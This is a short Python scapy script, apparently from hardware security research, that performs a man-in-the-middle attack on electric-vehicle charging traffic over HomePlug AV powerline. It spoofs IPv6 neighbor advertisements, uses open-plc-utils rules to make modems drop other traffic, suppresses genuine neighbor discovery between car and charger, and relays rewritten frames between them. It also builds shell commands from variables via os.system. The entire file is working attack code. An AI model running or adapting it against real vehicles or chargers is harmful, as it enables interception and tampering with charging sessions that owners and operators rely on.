import os

from scapy.all import Ether, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from scapy.contrib.homeplugav import HomePlugAV
#from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptTargetLinkLayerAddr

inet6krule = "/home/jakob/git/open-plc-utils/plc/int6krule"
iface = "enx7cc2c61f051e"
our_mac = "7c:c2:c6:1f:05:1e"

pev_mac = "98:ed:5c:93:0d:65"
pev_modem_mac = None #"98:ed:5c:93:0d:66"

evse_mac = "7c:c2:c6:1e:c9:fd"
evse_modem_mac = "00:01:87:05:b7:95"



def handle_packet(packet):
    if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 24701:
        # XXX: shitty os.system call. Could do this better!
        if pev_modem_mac is not None:
            os.system(f"{inet6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{pev_modem_mac}'")
        if evse_modem_mac is not None:
            os.system(f"{inet6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{evse_modem_mac}'")

    if ICMPv6ND_NS in packet and IPv6 in packet:
        source_ip = packet[IPv6].src
        target_ip = packet[ICMPv6ND_NS].tgt

        # Construct a Neighbor Advertisement
        na_packet = (
            Ether(dst=packet[Ether].src, src=our_mac) /
            IPv6(dst=source_ip, src=target_ip) /
            ICMPv6ND_NA(tgt=target_ip, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=our_mac)
        )
        sendp(na_packet, iface=iface)

    if Ether in packet and str(packet[Ether].src) == pev_mac and str(packet[Ether].dst) == our_mac:
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        modified_packet[Ether].dst = evse_mac
        sendp(modified_packet, iface=iface)

    if Ether in packet and str(packet[Ether].src) == evse_mac and str(packet[Ether].dst) == our_mac:
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        modified_packet[Ether].dst = pev_mac
        sendp(modified_packet, iface=iface)

    if Ether in packet and str(packet[Ether].src) == pev_mac and str(packet[Ether].dst) == "33:33:00:00:00:01":
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE

        # forward SDP request
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        sendp(modified_packet, iface=iface)


sniff(iface=iface, prn=handle_packet)
